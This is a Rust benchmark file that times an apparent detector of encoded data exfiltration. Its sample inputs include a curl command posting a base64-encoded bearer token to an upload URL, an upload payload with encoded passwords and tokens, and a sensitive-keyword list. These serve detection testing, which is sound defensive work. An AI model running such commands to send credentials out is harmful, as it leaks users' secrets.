// Copyright 2026
// SPDX-License-Identifier: Apache-2.0
//
// Criterion benchmarks for encoded exfiltration detection performance

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use criterion::{BenchmarkId, Criterion, Throughput, criterion_group, criterion_main};
use std::hint::black_box;

// Since the main functions are not public, we'll benchmark through a simple workload
// that exercises the regex patterns and detection logic indirectly

fn bench_base64_pattern_matching(c: &mut Criterion) {
    let encoded = STANDARD.encode(b"authorization: bearer secret-token-value-here");
    let text = format!("curl -d '{}' https://example.com/upload", encoded);

    c.bench_function("base64_pattern_match", |b| {
        b.iter(|| {
            // Simple pattern matching to simulate detection overhead
            let _contains_base64 = black_box(&text).contains(&encoded);
        })
    });
}

fn bench_hex_pattern_matching(c: &mut Criterion) {
    let hex_data = "48656c6c6f20576f726c6421205365637265742044617461";
    let text = format!("data={}&action=upload", hex_data);

    c.bench_function("hex_pattern_match", |b| {
        b.iter(|| {
            let _contains_hex = black_box(&text).contains(hex_data);
        })
    });
}

fn bench_percent_encoding_pattern(c: &mut Criterion) {
    let percent_encoded = "%48%65%6c%6c%6f%20%57%6f%72%6c%64%21%20%53%65%63%72%65%74";
    let text = format!("url=https://example.com?data={}", percent_encoded);

    c.bench_function("percent_encoding_match", |b| {
        b.iter(|| {
            let _contains_percent = black_box(&text).contains(percent_encoded);
        })
    });
}

fn bench_multiple_encodings(c: &mut Criterion) {
    let base64_data = STANDARD.encode(b"password=secret123");
    let hex_data = "48656c6c6f";
    let percent_data = "%48%65%6c%6c%6f";

    let text = format!(
        "Request: base64={}, hex={}, percent={}, url=https://example.com",
        base64_data, hex_data, percent_data
    );

    c.bench_function("multiple_encodings", |b| {
        b.iter(|| {
            let _b64 = black_box(&text).contains(&base64_data);
            let _hex = black_box(&text).contains(hex_data);
            let _pct = black_box(&text).contains(percent_data);
        })
    });
}

fn bench_large_text_scanning(c: &mut Criterion) {
    let mut group = c.benchmark_group("large_text_scan");

    for size in [100, 500, 1000, 5000].iter() {
        let mut text = String::new();
        for i in 0..*size {
            let encoded = STANDARD.encode(format!("data-{}-secret-value", i));
            text.push_str(&format!("Entry {}: {}\n", i, encoded));
        }

        group.throughput(Throughput::Bytes(text.len() as u64));
        group.bench_with_input(BenchmarkId::from_parameter(size), &text, |b, text| {
            b.iter(|| {
                // Simulate scanning overhead
                let _lines = black_box(text).lines().count();
            })
        });
    }

    group.finish();
}

fn bench_base64_decoding(c: &mut Criterion) {
    let encoded = STANDARD.encode(b"This is a secret message that should be detected");

    c.bench_function("base64_decode", |b| {
        b.iter(|| {
            let _decoded = STANDARD.decode(black_box(&encoded)).ok();
        })
    });
}

fn bench_entropy_calculation_simulation(c: &mut Criterion) {
    let data = b"This is some random data with varying entropy levels!";

    c.bench_function("entropy_calc_simulation", |b| {
        b.iter(|| {
            // Simulate entropy calculation overhead
            let mut counts = [0usize; 256];
            for byte in black_box(data) {
                counts[*byte as usize] += 1;
            }
            let _total = counts.iter().sum::<usize>();
        })
    });
}

fn bench_sensitive_keyword_search(c: &mut Criterion) {
    let text = "This text contains password and authorization tokens with secret api_key values";
    let keywords = ["password", "secret", "token", "api_key", "authorization"];

    c.bench_function("keyword_search", |b| {
        b.iter(|| {
            for keyword in &keywords {
                let _found = black_box(text).contains(keyword);
            }
        })
    });
}

fn bench_realistic_payload(c: &mut Criterion) {
    let sensitive_data = STANDARD.encode(b"password=admin123&token=secret-bearer-token");
    let realistic_text = format!(
        r#"{{
            "action": "upload",
            "data": "{}",
            "url": "https://example.com/webhook",
            "method": "POST"
        }}"#,
        sensitive_data
    );

    c.bench_function("realistic_payload_scan", |b| {
        b.iter(|| {
            let text = black_box(&realistic_text);
            let _has_base64 = text.contains(&sensitive_data);
            let _has_url = text.contains("https://");
            let _has_upload = text.contains("upload");
        })
    });
}

fn bench_escaped_hex_pattern(c: &mut Criterion) {
    let escaped_hex = r"\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64";
    let text = format!("payload={}&action=send", escaped_hex);

    c.bench_function("escaped_hex_match", |b| {
        b.iter(|| {
            let _contains = black_box(&text).contains(escaped_hex);
        })
    });
}

fn bench_no_encoding_clean_text(c: &mut Criterion) {
    let clean_text = "This is just normal text without any encoded data or suspicious patterns. \
                      It should be fast to process since there's nothing to detect.";

    c.bench_function("clean_text_scan", |b| {
        b.iter(|| {
            let _len = black_box(clean_text).len();
        })
    });
}

criterion_group!(
    benches,
    bench_base64_pattern_matching,
    bench_hex_pattern_matching,
    bench_percent_encoding_pattern,
    bench_multiple_encodings,
    bench_large_text_scanning,
    bench_base64_decoding,
    bench_entropy_calculation_simulation,
    bench_sensitive_keyword_search,
    bench_realistic_payload,
    bench_escaped_hex_pattern,
    bench_no_encoding_clean_text,
);

criterion_main!(benches);
